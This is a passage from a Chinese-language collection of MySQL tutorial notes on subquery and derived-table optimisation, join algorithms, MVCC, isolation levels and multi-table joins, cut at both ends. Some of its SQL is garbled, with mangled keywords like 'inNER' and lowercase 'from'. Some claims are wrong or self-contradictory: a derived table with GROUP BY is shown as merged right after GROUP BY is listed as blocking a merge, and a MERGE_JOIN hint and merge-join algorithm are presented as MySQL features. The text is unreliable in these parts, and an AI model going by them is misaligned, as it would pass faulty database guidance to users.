| FirstMatch          | 对外表每行，在内表找第一个匹配 |
| LooseScan           | 利用索引扫描去重               |
| SemiJoinMaterialize | 物化子查询结果为临时表         |
| DuplicateWeedout    | 使用临时表去重                 |

```sql
-- 查看使用的半连接策略
EXPLAIN FORMAT=JSON
SELECT * FROM orders WHERE user_id IN (SELECT id FROM users WHERE vip = true);
-- 查看 "chosen" 策略
```

## 3. 子查询物化

```sql
-- MySQL 将 IN 子查询结果物化为临时表
SELECT * FROM orders
WHERE user_id IN (SELECT id FROM users WHERE vip = true);

-- 执行流程：
-- 1. 执行子查询，结果写入临时表（带主键去重）
-- 2. 外查询通过临时表进行半连接

-- EXPLAIN 中 select_type = MATERIALIZED
```

## 4. IN vs EXISTS 优化

```sql
-- MySQL 8.0+ 优化器通常将 IN 和 EXISTS 转换为相同的半连接
-- 选择建议：让优化器决定

-- IN 子查询
SELECT * FROM orders
WHERE user_id IN (SELECT id FROM users WHERE vip = true);

-- EXISTS 子查询
SELECT * FROM orders o
WHERE EXISTS (SELECT 1 FROM users u WHERE u.id = o.user_id AND u.vip = true);

-- 两者在 MySQL 8.0 中通常生成相同的执行计划
```

## 5. 关联子查询优化

```sql
-- 低效：关联子查询
SELECT * FROM employees e
WHERE salary > (SELECT AVG(salary) FROM employees WHERE dept_id = e.dept_id);

-- 优化1：使用窗口函数
SELECT * FROM (
    SELECT *, AVG(salary) OVER (PARTITION BY dept_id) AS dept_avg
    FROM employees
) t WHERE salary > dept_avg;

-- 优化2：使用 JOIN
SELECT e.*
FROM employees e
JOIN (
    SELECT dept_id, AVG(salary) AS avg_salary
    FROM employees
    GROUP BY dept_id
) dept_avg ON e.dept_id = dept_avg.dept_id
WHERE e.salary > dept_avg.avg_salary;
```

<!-- ============ 文档分隔线：020-mysql/026-DerivedTableOptimization.md ============ -->

## 1. 派生表概述

派生表（Derived Table）是 FROM 子句中的子查询，MySQL 8.0 对派生表有多种优化策略。

## 2. 合并策略

### 2.1 条件合并

MySQL 8.0 默认将派生表合并到外查询中，避免物化临时表：

```sql
-- 原始查询
SELECT * FROM (
    SELECT dept_id, AVG(salary) AS avg_salary
    FROM employees
    GROUP BY dept_id
) dept_avg
WHERE avg_salary > 50000;

-- 优化器合并后等价于
SELECT dept_id, AVG(salary) AS avg_salary
FROM employees
GROUP BY dept_id
HAVING AVG(salary) > 50000;
```

### 2.2 合并条件

- 派生表没有 LIMIT
- 派生表没有 GROUP BY（合并后外查询有 GROUP BY 除外）
- 派生表没有 DISTINCT
- 派生表没有窗口函数
- 派生表没有 UNION

```sql
-- 阻止合并（需要物化）
SELECT /*+ NO_MERGE(dept_avg) */ *
FROM (
    SELECT dept_id, AVG(salary) AS avg_salary
    FROM employees
    GROUP BY dept_id
) dept_avg
WHERE avg_salary > 50000;
```

## 3. 物化策略

### 3.1 何时物化

当无法合并时，MySQL 将派生表物化为临时表：

```sql
-- 包含 LIMIT 的派生表会被物化
SELECT * FROM (
    SELECT * FROM employees ORDER BY salary DESC LIMIT 10
) top_earners;

-- 包含 DISTINCT 的派生表会被物化
SELECT * FROM (
    SELECT DISTINCT dept_id FROM employees
) unique_depts;
```

## 4. LATERAL 派生表

```sql
-- MySQL 8.0.14+ 支持 LATERAL
-- 每个部门薪资最高的3名员工
SELECT d.dept_name, top3.name, top3.salary
FROM departments d,
LATERAL (
    SELECT name, salary
    FROM employees e
    WHERE e.dept_id = d.id
    ORDER BY salary DESC
    LIMIT 3
) top3;
```

<!-- ============ 文档分隔线：020-mysql/027-GroupByOrderByOptimization.md ============ -->

## 1. GROUP BY 优化

### 1.1 使用索引避免临时表

```sql
-- 索引 (dept_id, name)
-- GROUP BY 可以利用索引排序
SELECT dept_id, COUNT(*) FROM employees GROUP BY dept_id;
-- Extra: Using index

-- 无索引时需要临时表
-- Extra: Using temporary; Using filesort
```

### 1.2 松散索引扫描（Loose Index Scan）

```sql
-- 适用于：GROUP BY 列有索引，且 MIN/MAX 聚合
-- 索引 (dept_id, salary)
SELECT dept_id, MIN(salary) FROM employees GROUP BY dept_id;
-- Extra: Using index for group-by

-- 松散索引扫描跳过索引中不需要的条目
-- 只读取每个 dept_id 的第一条（MIN）或最后一条（MAX）
```

### 1.3 紧凑索引扫描

```sql
-- 索引 (dept_id, name)
-- WHERE 条件和 GROUP BY 一起使用索引
SELECT dept_id, COUNT(*) FROM employees
WHERE dept_id > 5
GROUP BY dept_id;
-- 扫描索引的 dept_id > 5 部分
```

## 2. ORDER BY 优化

### 2.1 使用索引排序

```sql
-- 索引 (dept_id, salary)
-- ORDER BY 与索引顺序一致
SELECT * FROM employees WHERE dept_id = 5 ORDER BY salary;
-- Extra: Using index condition（无需 filesort）

-- ORDER BY 与索引顺序不一致
SELECT * FROM employees ORDER BY salary;
-- Extra: Using filesort
```

### 2.2 filesort 算法

| 算法     | 说明                                   |
| -------- | -------------------------------------- |
| 双路排序 | 读取行指针和排序列，排序后回表获取数据 |
| 单路排序 | 读取所有需要的列到内存，排序后直接输出 |

```sql
-- 控制 filesort 缓冲区
SET max_length_for_sort_data = 4096;  -- 超过此值使用双路排序
SET sort_buffer_size = 262144;        -- 排序缓冲区大小
```

## 3. GROUP BY + ORDER BY 组合优化

```sql
-- 索引 (dept_id, created_at)
-- GROUP BY + ORDER BY 使用同一索引
SELECT dept_id, COUNT(*) AS cnt
FROM orders
GROUP BY dept_id
ORDER BY dept_id;
-- Extra: Using index

-- GROUP BY 和 ORDER BY 列不同
SELECT dept_id, COUNT(*) AS cnt
FROM orders
GROUP BY dept_id
ORDER BY cnt DESC;
-- Extra: Using temporary; Using filesort
-- 需要临时表 + 额外排序
```

<!-- ============ 文档分隔线：020-mysql/028-JOINAlgorithm.md ============ -->

## 1. JOIN 算法概述

MySQL 支持多种 JOIN 算法，优化器根据表大小、索引和条件选择最优算法。

## 2. Nested Loop Join（NLJ）

### 2.1 原理

```
for each row in outer_table:
    for each row in inner_table:
        if match_condition:
            output combined row
```

```sql
-- 驱动表：departments，被驱动表：employees
SELECT * FROM departments d JOIN employees e ON d.id = e.dept_id;

-- 执行过程：
-- 1. 扫描 departments 表的每一行
-- 2. 对每行，使用 idx_employees_dept_id 索引查找 employees
-- 3. 如果有索引：Index Nested Loop Join
-- 4. 如果无索引：Block Nested Loop Join
```

### 2.2 Index Nested Loop Join

```sql
-- 被驱动表有索引时使用
-- 时间复杂度：O(M * log N)
-- M = 驱动表行数，N = 被驱动表行数

-- 确保 JOIN 列有索引
CREATE INDEX idx_employees_dept_id ON employees(dept_id);
```

## 3. Block Nested Loop Join（BNL）

### 3.1 原理

```
1. 将驱动表的数据块读入 join_buffer
2. 扫描被驱动表，与 join_buffer 中的数据匹配
3. 减少被驱动表的扫描次数
```

```sql
-- 被驱动表无索引时使用
-- join_buffer_size 控制缓冲区大小
SET join_buffer_size = 262144;  -- 256KB

-- EXPLAIN 中 Extra: Using join buffer (Block Nested Loop)
```

### 3.2 优化

```sql
-- 增大 join_buffer_size
SET join_buffer_size = 8388608;  -- 8MB

-- 为 JOIN 列创建索引（转为 Index NLJ）
CREATE INDEX idx_join_col ON table_name(join_col);

-- 小表做驱动表
-- 驱动表越小，join_buffer 效果越好
```

## 4. Hash Join

### 4.1 原理

MySQL 8.0.18 引入 Hash Join，替代无索引场景下的 BNL：

```
1. Build 阶段：扫描小表，构建哈希表
2. Probe 阶段：扫描大表，在哈希表中查找匹配
```

```sql
-- 等值连接无索引时自动使用
SELECT * FROM t1 JOIN t2 ON t1.col = t2.col;
-- Extra: Using join buffer (hash join)

-- Hash Join 优势：
-- 时间复杂度：O(M + N)，比 BNL 的 O(M * N) 好
-- 不需要索引
```

### 4.2 Hash Join 限制

```sql
-- 仅支持等值连接（=, <=>）
-- 不支持非等值连接（>, <, BETWEEN）

-- 非等值连接仍使用 BNL
SELECT * FROM t1 JOIN t2 ON t1.col > t2.col;
-- Extra: Using join buffer (Block Nested Loop)
```

## 5. JOIN 优化策略

```sql
-- 1. 确保 JOIN 列有索引
-- 2. 小表做驱动表
-- 3. 避免过多表连接（建议不超过5个）
-- 4. 使用 STRAIGHT_JOIN 控制连接顺序
SELECT /*+ STRAIGHT_JOIN */ *
FROM small_table s
JOIN large_table l ON s.id = l.small_id;

-- 5. 使用 BKA（Batched Key Access）
SET optimizer_switch = 'batched_key_access=on';
-- 将驱动表的行批量传递给被驱动表
```
## INNER JOIN 内连接

**换行写法：内连接查询**
`SELECT <列> FROM <表1> INNER JOIN <表2> ON <连接条件>;`
```sql
-- 查询用户及其订单
SELECT u.username, o.order_no, o.total_amount
FROM users u
INNER JOIN orders o ON u.id = o.user_id;
```

**换行写法：多表内连接**
`SELECT <列> FROM <表1> JOIN <表2> ON <条件> JOIN <表3> ON <条件>;`
```sql
-- 三表关联查询
SELECT u.username, o.order_no, p.product_name
FROM users u
JOIN orders o ON u.id = o.user_id
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id;
```

**换行写法：使用 USING 简化连接**
`SELECT <列> FROM <表1> JOIN <表2> USING (<同名列>);`
```sql
-- 两表同名列时使用 USING
SELECT * FROM users JOIN user_profiles USING (user_id);
```

---

## LEFT JOIN 左连接

**换行写法：左连接查询**
`SELECT <列> FROM <表1> LEFT JOIN <表2> ON <连接条件>;`
```sql
-- 查询所有用户及其订单（含无订单用户）
SELECT u.username, o.order_no
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;
```

**换行写法：左连接筛选无匹配记录**
`SELECT <列> FROM <表1> LEFT JOIN <表2> ON <条件> WHERE <表2.列> IS NULL;`
```sql
-- 查询没有订单的用户
SELECT u.username
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
WHERE o.id IS NULL;
```

---

## RIGHT JOIN 右连接

**换行写法：右连接查询**
`SELECT <列> FROM <表1> RIGHT JOIN <表2> ON <连接条件>;`
```sql
-- 查询所有订单及其用户（含无用户订单）
SELECT u.username, o.order_no
FROM users u
RIGHT JOIN orders o ON u.id = o.user_id;
```

---

## CROSS JOIN 交叉连接

**单行写法：笛卡尔积**
`SELECT * FROM <表1> CROSS JOIN <表2>;`
```sql
-- 生成两表的笛卡尔积
SELECT * FROM colors CROSS JOIN sizes;
```

**单行写法：逗号连接等价写法**
`SELECT * FROM <表1>, <表2>;`
```sql
-- 逗号分隔等价于 CROSS JOIN
SELECT * FROM colors, sizes;
```

---

## 自连接

**换行写法：员工与上级自连接**
`SELECT <别名1.列>, <别名2.列> FROM <表> <别名1> JOIN <表> <别名2> ON <条件>;`
```sql
-- 查询员工姓名及其直接上级
SELECT e.name AS employee, m.name AS manager
FROM employees e
LEFT JOIN employees m ON e.manager_id = m.id;
```

**换行写法：同级分类自连接**
`SELECT <别名1.列>, <别名2.列> FROM <表> <别名1> JOIN <表> <别名2> ON <条件>;`
```sql
-- 查询分类及其父分类名称
SELECT c.name AS category, p.name AS parent
FROM categories c
LEFT JOIN categories p ON c.parent_id = p.id;
```

---

## 自然连接与 USING

**换行写法：NATURAL JOIN 自然连接**
`SELECT * FROM <表1> NATURAL JOIN <表2>;`
```sql
-- 自动按同名列连接
SELECT * FROM users NATURAL JOIN user_profiles;
```

---

## 复合条件连接

**换行写法：多条件连接**
`SELECT <列> FROM <表1> JOIN <表2> ON <条件1> AND <条件2>;`
```sql
-- 多条件关联
SELECT u.username, o.order_no
FROM users u
JOIN orders o ON u.id = o.user_id AND o.status = 1;
```

**换行写法：连接加过滤条件**
`SELECT <列> FROM <表1> JOIN <表2> ON <条件> WHERE <过滤条件>;`
```sql
-- 连接后再过滤
SELECT u.username, o.order_no
FROM users u
JOIN orders o ON u.id = o.user_id
WHERE u.status = 1 AND o.created_at > '2024-01-01';
```

---

## 聚合与连接

**换行写法：连接加分组聚合**
`SELECT <列>, <聚合函数> FROM <表1> JOIN <表2> ON <条件> GROUP BY <列>;`
```sql
-- 查询每个用户的订单总数和总金额
SELECT u.username, COUNT(o.id) AS order_count, IFNULL(SUM(o.total_amount), 0) AS total
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
GROUP BY u.id, u.username;
```

**换行写法：连接加 HAVING 过滤**
`SELECT <列>, <聚合> FROM <表1> JOIN <表2> ON <条件> GROUP BY <列> HAVING <条件>;`
```sql
-- 查询订单金额超过 1000 的用户
SELECT u.username, SUM(o.total_amount) AS total
FROM users u
JOIN orders o ON u.id = o.user_id
GROUP BY u.id, u.username
HAVING total > 1000;
```

---

## 8.0+ 高级连接特性

**换行写法：NOWAIT 不等待锁**
`SELECT * FROM <表1> JOIN <表2> ON <条件> FOR UPDATE NOWAIT;`
```sql
-- 行被锁时立即报错不等待
SELECT * FROM users u JOIN orders o ON u.id = o.user_id FOR UPDATE NOWAIT;
```

**换行写法：SKIP LOCKED 跳过锁定行**
`SELECT * FROM <表1> JOIN <表2> ON <条件> FOR UPDATE SKIP LOCKED;`
```sql
-- 跳过被其他事务锁定的行
SELECT * FROM users u JOIN orders o ON u.id = o.user_id FOR UPDATE SKIP LOCKED;
```

**换行写法：LATERAL 派生表（8.0.14+）**
`SELECT * FROM <表1>, LATERAL (SELECT * FROM <表2> WHERE <条件> LIMIT <数量>) <别名>;`
```sql
-- 关联派生表查询每个用户最近 3 笔订单
SELECT u.username, o.order_no
FROM users u,
LATERAL (
  SELECT order_no, total_amount
  FROM orders
  WHERE user_id = u.id
  ORDER BY created_at DESC
  LIMIT 3
) o;
```

<!-- ============ 文档分隔线：020-mysql/029-TransactionIsolationImplementation.md ============ -->

## 1. InnoDB 隔离级别实现概述

InnoDB 通过 MVCC + 锁机制实现不同隔离级别。

| 隔离级别        | 快照读实现                   | 当前读实现    |
| --------------- | ---------------------------- | ------------- |
| READ COMMITTED  | 每次 SELECT 新 Read View     | 行级记录锁    |
| REPEATABLE READ | 事务首次 SELECT 的 Read View | Next-Key Lock |
| SERIALIZABLE    | 所有 SELECT 加共享锁         | Next-Key Lock |

## 2. READ COMMITTED 实现

### 2.1 快照读

```sql
-- 每次 SELECT 生成新的 Read View
BEGIN;
SELECT * FROM t WHERE id = 1;  -- Read View 1
-- 其他事务修改并提交
SELECT * FROM t WHERE id = 1;  -- Read View 2（新快照，能看到已提交修改）
COMMIT;
```

### 2.2 当前读

```sql
-- 当前读使用记录锁，不加间隙锁
BEGIN;
SELECT * FROM t WHERE id > 5 FOR UPDATE;
-- 只锁定 id > 5 的已有记录
-- 其他事务可以插入 id = 6 的新行
```

## 3. REPEATABLE READ 实现

### 3.1 快照读

```sql
-- 事务首次 SELECT 生成 Read View，后续复用
BEGIN;
SELECT * FROM t WHERE id = 1;  -- 生成 Read View
-- 其他事务修改并提交
SELECT * FROM t WHERE id = 1;  -- 复用 Read View，看不到修改
COMMIT;
```

### 3.2 当前读

```sql
-- 当前读使用 Next-Key Lock（记录锁 + 间隙锁）
BEGIN;
SELECT * FROM t WHERE id > 5 FOR UPDATE;
-- 锁定 id > 5 的所有记录和间隙
-- 其他事务不能插入 id > 5 的新行
```

## 4. SERIALIZABLE 实现

```sql
-- 所有 SELECT 自动加共享锁
-- 等价于 SELECT ... LOCK IN SHARE MODE
BEGIN;
SELECT * FROM t WHERE id = 1;  -- 自动加 S 锁
-- 其他事务无法修改 id = 1
COMMIT;
```

## 5. Read View 详解

### 5.1 核心字段

```
m_ids：创建时所有活跃事务ID列表
min_trx_id：m_ids 中最小值
max_trx_id：下一个将分配的事务ID
creator_trx_id：创建者事务ID
```

### 5.2 可见性判断

```
对于版本链中 trx_id：
1. trx_id < min_trx_id → 可见（事务已提交）
2. trx_id >= max_trx_id → 不可见（Read View 后开始的事务）
3. trx_id 在 m_ids 中 → 不可见（事务未提交）
4. trx_id 不在 m_ids 中 → 可见（事务已提交）
```

<!-- ============ 文档分隔线：020-mysql/030-MVCCPrinciple.md ============ -->

## 1. MVCC 基础组件

### 1.1 隐藏列

InnoDB 每行数据包含三个隐藏列：

| 列名        | 大小  | 用途                           |
| ----------- | ----- | ------------------------------ |
| DB_TRX_ID   | 6字节 | 最后修改该行的事务ID           |
| DB_ROLL_PTR | 7字节 | 回滚指针，指向 undo log 前版本 |
| DB_ROW_ID   | 6字节 | 隐藏自增ID（无主键时使用）     |

### 1.2 Undo Log 版本链

```
当前行：{data='Alice', trx_id=300, roll_ptr → undo_2}
                                           ↓
undo_2：{data='Bob', trx_id=200, roll_ptr → undo_1}
                                           ↓
undo_1：{data='Charlie', trx_id=100, roll_ptr → NULL}
```

每次 UPDATE 都在 undo log 中保留旧版本，形成版本链。

## 2. Read View

### 2.1 创建时机

| 隔离级别        | 创建时机                     |
| --------------- | ---------------------------- |
| READ COMMITTED  | 每次 SELECT 创建新 Read View |
| REPEATABLE READ | 事务首次 SELECT 创建，复用   |

### 2.2 核心字段

```
creator_trx_id：创建该 Read View 的事务ID
m_ids：创建时所有活跃（未提交）事务ID列表
min_trx_id：活跃事务最小ID
max_trx_id：下一个将分配的事务ID
```

## 3. 可见性判断

```
对于版本链中某版本的 trx_id：

if trx_id == creator_trx_id:
    → 可见（自己修改的）

if trx_id < min_trx_id:
    → 可见（事务在 Read View 创建前已提交）

if trx_id >= max_trx_id:
    → 不可见（事务在 Read View 创建后才开始）

if min_trx_id <= trx_id < max_trx_id:
    if trx_id in m_ids:
        → 不可见（事务未提交）
    else:
        → 可见（事务已提交）
```

## 4. 版本遍历

```
1. 读取当前行的 trx_id
2. 判断当前版本是否可见
3. 可见 → 返回该版本数据
4. 不可见 → 沿 roll_ptr 找到上一个版本
5. 重复步骤2-4
6. 版本链遍历完仍不可见 → 该行对当前事务不可见
```

## 5. 快照读 vs 当前读

```sql
-- 快照读：使用 MVCC
SELECT * FROM t WHERE id = 1;

-- 当前读：读取最新数据 + 加锁
SELECT * FROM t WHERE id = 1 FOR UPDATE;
SELECT * FROM t WHERE id = 1 LOCK IN SHARE MODE;
UPDATE t SET col = val WHERE id = 1;
DELETE FROM t WHERE id = 1;
```

## 6. Purge 机制

```
Purge 线程负责清理不再需要的 undo log：
1. 检查某版本是否对所有活跃事务都不可见
2. 如果是，该版本可以安全清理
3. 长事务会阻止 Purge，导致 undo log 膨胀
```

<!-- ============ 文档分隔线：020-mysql/031-MultiTableJoinDetailed.md ============ -->

## 1. 联查基础概念

### 1.1 什么是多表联查

多表联查是指通过一定的条件将两个或多个表的数据关联在一起，从而获取更丰富的信息。

```sql
 SELECT 列列表
 from 表1
 JOIN 表2 ON 连接条件
 JOIN 表3 ON 连接条件
 WHERE 过滤条件;
```

### 1.2 联查的必要性

| 场景             | 单表查询     | 多表联查 |
| ---------------- | ------------ | -------- |
| 获取单一实体信息 | [x] 适用     | [ ] 冗余 |
| 获取关联实体信息 | [ ] 无法完成 | [x] 适用 |
| 数据完整性       | 有限         | 完整     |

### 1.3 关系数据库中的表关系

- **一对一关系**：如用户表和用户详情表
- **一对多关系**：如部门表和员工表
- **多对多关系**：如学生表和课程表（需中间表）

---

## 2. 联查类型详解

### 2.1 INNER JOIN（内连接）

**定义**：只返回两个表中匹配连接条件的行。
**Venn 图表示**：两个集合的交集

```mermaid
flowchart LR
    subgraph A[表A]
        A1[1] A2[2] A3[3] A4[4]
    end
    subgraph B[表B]
        B1[A] B2[B] B3[C]
    end
    A1 --- B1
    A2 --- B2
    A3 --- B3
```

**语法**：

```sql
 SELECT *
 from table1
 inNER JOIN table2 ON table1.id = table2.id;
 SELECT *
 from table1
 JOIN table2 ON table1.id = table2.id;
```

**示例**：

```sql
 SELECT e.emp_name, d.dept_name
 from employees e
 inNER JOIN departments d ON e.dept_id = d.dept_id;
```

### 2.2 LEFT JOIN（左外连接）

**定义**：返回左表的所有行，以及右表中匹配的行；右表不匹配的部分用 NULL 填充。
**Venn 图表示**：左集合全部 + 交集部分

```mermaid
flowchart LR
    subgraph A[表A]
        A1[1] A2[2] A3[3] A4[4]
    end
    subgraph B[表B]
        B1[A] B2[B] B3[C]
    end
    A1 --- B1
    A2 --- B2
    A3 --- B3
```

**语法**：

```sql
 SELECT *
 from table1
 LEFT JOIN table2 ON table1.id = table2.id;
```

**示例**：

```sql
 SELECT d.dept_name, e.emp_name
 from departments d
 LEFT JOIN employees e ON d.dept_id = e.dept_id;
```

### 2.3 RIGHT JOIN（右外连接）

**定义**：返回右表的所有行，以及左表中匹配的行；左表不匹配的部分用 NULL 填充。
**Venn 图表示**：右集合全部 + 交集部分

```mermaid
flowchart LR
    subgraph A[表A]
        A1[1] A2[2]
    end
    subgraph B[表B]
        B1[A] B2[B] B3[C] B4[D]
    end
    A1 --- B1
    A2 --- B2
```

**语法**：

```sql
 SELECT *
 from table1
 RIGHT JOIN table2 ON table1.id = table2.id;
```

**示例**：

```sql
 SELECT o.order_id, u.username
 from users u
 RIGHT JOIN orders o ON u.id = o.user_id;
```

### 2.4 FULL JOIN（全外连接）

**定义**：返回两个表的所有行，不匹配的部分用 NULL 填充。
**注意**：MySQL 不直接支持 FULL JOIN，需要通过 `UNION` 模拟。
**Venn 图表示**：两个集合的并集

```mermaid
flowchart LR
    subgraph A[表A]
        A1[1] A2[2] A3[3]
    end
    subgraph B[表B]
        B1[A] B2[B] B3[C] B4[D]
    end
    A1 --- B1
    A2 --- B2
```

**语法**：

```sql
 SELECT *
 from table1
 LEFT JOIN table2 ON table1.id = table2.id
 UNION
 SELECT *
 from table1
 RIGHT JOIN table2 ON table1.id = table2.id;
```

### 2.5 CROSS JOIN（交叉连接）

**定义**：返回两个表的笛卡尔积，即左表的每一行与右表的每一行组合。
**注意**：结果行数 = 左表行数 × 右表行数，通常需要配合 WHERE 条件过滤。
**语法**：

```sql
 SELECT * FROM table1 CROSS JOIN table2;
 SELECT * FROM table1, table2;
 SELECT * FROM table1 CROSS JOIN table2 WHERE condition;
```

**示例**：

```sql
 SELECT d.dept_name, e.emp_name
 from departments d
 CROSS JOIN employees e;
```

### 2.6 NATURAL JOIN（自然连接）

**定义**：自动根据相同列名进行连接，不需要指定连接条件。
**注意**：使用时要谨慎，确保列名相同且语义一致。
**语法**：

```sql
 SELECT * FROM employees NATURAL JOIN departments;
 SELECT * FROM employees NATURAL LEFT JOIN departments;
 SELECT * FROM employees NATURAL RIGHT JOIN departments;
```

### 2.7 USING 子句

**定义**：当两个表有相同列名时，可以使用 USING 简化连接语法。
**语法**：

```sql
 SELECT e.emp_name, d.dept_name
 from employees e
 JOIN departments d USING (dept_id);
```

**等价于**：

```sql
 SELECT e.emp_name, d.dept_name
 from employees e
 JOIN departments d ON e.dept_id = d.dept_id;
```

---

## 3. 联查执行原理

### 3.1 联查执行顺序

```sql
 SELECT 列列表 -- 5. 选择列
 from 表1 -- 1. 加载表1
 JOIN 表2 ON 条件 -- 2. 联查表2
 JOIN 表3 ON 条件 -- 3. 联查表3
 WHERE 过滤条件 -- 4. 过滤行
 GROUP BY 分组列 -- 6. 分组
 HAVING 分组过滤 -- 7. 分组过滤
 ORDER BY 排序列 -- 8. 排序
 LIMIT 限制行数; -- 9. 限制结果
```

### 3.2 联查算法

#### 3.2.1 Nested Loop Join（嵌套循环连接）

**原理**：外层循环遍历驱动表，内层循环遍历被驱动表。
**适用场景**：小表驱动大表

```sql
 EXPLAIN
 SELECT e.emp_name, d.dept_name
 from employees e
 JOIN departments d ON e.dept_id = d.dept_id;
```

**执行过程**：

1. 遍历 employees 表（驱动表）
2. 对于每个员工，查找对应的部门（被驱动表）
3. 如果 departments.dept_id 有索引，效率很高

#### 3.2.2 Hash Join（哈希连接）

**原理**：先将小表构建成哈希表，然后扫描大表进行哈希匹配。
**适用场景**：大表之间的连接，MySQL 8.0+ 支持

```sql
 SELECT /*+ HASH_JOIN(d) */
  e.emp_name, d.dept_name
 from employees e
 JOIN departments d ON e.dept_id = d.dept_id;
```

**执行过程**：

1. 将 departments 表构建成哈希表（key: dept_id, value: dept_name）
2. 扫描 employees 表，对每个 dept_id 进行哈希查找
3. 返回匹配的结果

#### 3.2.3 Merge Join（合并连接）

**原理**：先对两个表按连接列排序，然后并行扫描合并。
**适用场景**：连接列已排序或有索引
**执行过程**：

1. 对 employees 按 dept_id 排序
2. 对 departments 按 dept_id 排序
3. 并行扫描两个有序表，合并匹配行

### 3.3 驱动表选择

**规则**：

1. 小表作为驱动表，减少外层循环次数
2. 如果有 WHERE 条件过滤，优先选择过滤后结果集小的表
3. 查看执行计划中的 `type` 和 `rows` 字段判断

```sql
 EXPLAIN ANALYZE
 SELECT e.emp_name, d.dept_name
 from employees e
 JOIN departments d ON e.dept_id = d.dept_id;
```

---

## 4. 联查实战场景

### 4.1 一对多关系联查

```sql
 SELECT
  o.order_id,
  o.order_date,
  oi.product_name,
  oi.quantity,
  oi.price
 from orders o
 JOIN order_items oi ON o.order_id = oi.order_id
 WHERE o.order_date >= '2024-01-01';
```

### 4.2 多对多关系联查

```sql
 SELECT
  s.student_name,
  c.course_name
 from students s
 JOIN student_course sc ON s.student_id = sc.student_id
 JOIN courses c ON sc.course_id = c.course_id
 WHERE c.course_name = '数学';
```

### 4.3 自连接

```sql
 SELECT
  e.emp_name AS 员工,
  m.emp_name AS 上级
 from employees e
 LEFT JOIN employees m ON e.manager_id = m.emp_id;
 with RECURSIVE emp_hierarchy AS (
  SELECT emp_id, emp_name, manager_id, 1 AS level
  FROM employees
  WHERE manager_id IS NULL
  UNION ALL
  SELECT e.emp_id, e.emp_name, e.manager_id, eh.level + 1
  FROM employees e
  JOIN emp_hierarchy eh ON e.manager_id = eh.emp_id
 )
 SELECT * FROM emp_hierarchy ORDER BY level, emp_id;
```

### 4.4 三表及以上联查

```sql
 SELECT
  u.username,
  o.order_id,
  o.order_date,
  p.product_name,
  oi.quantity,
  oi.price
 from users u
 JOIN orders o ON u.id = o.user_id
 JOIN order_items oi ON o.order_id = oi.order_id
 JOIN products p ON oi.product_id = p.product_id
 WHERE o.order_date BETWEEN '2024-01-01' AND '2024-01-31';
```

### 4.5 条件联查

```sql
 SELECT
  e.emp_name,
  d.dept_name,
  COUNT(o.order_id) AS order_count
 from employees e
 JOIN departments d ON e.dept_id = d.dept_id
 LEFT JOIN orders o ON e.emp_id = o.emp_id
 WHERE d.dept_name = '技术部'
  AND e.hire_date < '2020-01-01'
 GROUP BY e.emp_id, e.emp_name, d.dept_name
 HAVING COUNT(o.order_id) > 10;
```

---

## 5. 联查性能优化

### 5.1 索引优化

**原则**：确保连接列和 WHERE 条件列有索引

```sql
 CREATE INDEX idx_employees_dept_id ON employees(dept_id);
 CREATE INDEX idx_orders_user_id ON orders(user_id);
 CREATE INDEX idx_orders_user_date ON orders(user_id, order_date);
 CREATE UNIQUE INDEX idx_users_email ON users(email);
```

### 5.2 减少数据量

**策略**：

1. 使用 WHERE 条件提前过滤数据
2. 只选择需要的列，避免 SELECT \*
3. 使用 LIMIT 限制结果集

```sql
 SELECT * FROM employees JOIN departments ON ...;
 SELECT e.emp_name, d.dept_name
 from employees e
 JOIN departments d ON e.dept_id = d.dept_id
 WHERE e.status = 1
 LIMIT 100;
```

### 5.3 优化连接顺序

**原则**：小表驱动大表

```sql
 EXPLAIN
 SELECT e.emp_name, o.order_id
 from employees e
 JOIN orders o ON e.emp_id = o.emp_id;
```

### 5.4 使用提示优化器

```sql
 SELECT /*+ INDEX(e idx_employees_dept_id) */
  e.emp_name, d.dept_name
 from employees e
 JOIN departments d ON e.dept_id = d.dept_id;
 SELECT /*+ HASH_JOIN(d) */
  e.emp_name, d.dept_name
 from employees e
 JOIN departments d ON e.dept_id = d.dept_id;
 SELECT /*+ MERGE_JOIN(d) */
  e.emp_name, d.dept_name
 from employees e
 JOIN departments d ON e.dept_id = d.dept_id;
```

### 5.5 避免复杂子查询

**优化前**：

```sql
 SELECT emp_name
 from employees
 WHERE dept_id IN (SELECT dept_id FROM departments WHERE dept_name LIKE '%技术%');
```

**优化后**：

```sql
 SELECT e.emp_name
 from employees e
 JOIN departments d ON e.dept_id = d.dept_id
 WHERE d.dept_name LIKE '%技术%';
```

---

## 6. 常见问题与解决方案

### 6.1 重复数据问题

**问题**：联查后出现重复行
**原因**：一对多关系导致的笛卡尔积
**解决方案**：

```sql
 SELECT DISTINCT e.emp_name
 from employees e
 JOIN orders o ON e.emp_id = o.emp_id;
 SELECT e.emp_name
 from employees e
 JOIN orders o ON e.emp_id = o.emp_id
 GROUP BY e.emp_id, e.emp_name;
```

### 6.2 NULL 值处理

**问题**：外连接后出现 NULL 值
**解决方案**：

```sql
 SELECT
  e.emp_name,
  COALESCE(d.dept_name, '无部门') AS dept_name
 from employees e
 LEFT JOIN departments d ON e.dept_id = d.dept_id;
 SELECT
  e.emp_name,
  IFNULL(d.dept_name, '无部门') AS dept_name
 from employees e
 LEFT JOIN departments d ON e.dept_id = d.dept_id;
```

### 6.3 性能问题

**问题**：联查慢
**解决方案**：

1. 检查索引是否存在
2. 分析执行计划
3. 优化连接顺序
4. 减少返回数据量

```sql
 EXPLAIN ANALYZE
 SELECT ...
 SHOW INDEX FROM employees;
 SHOW VARIABLES LIKE 'slow_query_log';
```

### 6.4 连接条件错误

**问题**：返回结果不符合预期
**常见错误**：

- 忘记写连接条件（导致笛卡尔积）
- 连接条件错误（导致错误匹配）
- 使用错误的连接类型
  **解决方案**：

```sql
 SELECT * FROM employees, departments; -- 笛卡尔积
 SELECT * FROM employees e JOIN departments d ON e.dept_id = d.dept_id;
 SELECT * FROM employees e JOIN departments d ON e.emp_id = d.dept_id;
 SELECT * FROM employees e JOIN departments d ON e.dept_id = d.dept_id;
```

<!-- ============ 文档分隔线：020-mysql/032-LockClassification.md ============ -->

## 1. 锁分类总览

```mermaid
flowchart TD
    T0["MySQL 锁"]
    T1["全局锁"]
    T2["表级锁"]
    T3["表锁（READ/WRITE）"]
    T4["元数据锁（MDL）"]
    T5["意向锁（IS/IX）"]
    T6["行级锁"]
    T7["记录锁（Record Lock）"]
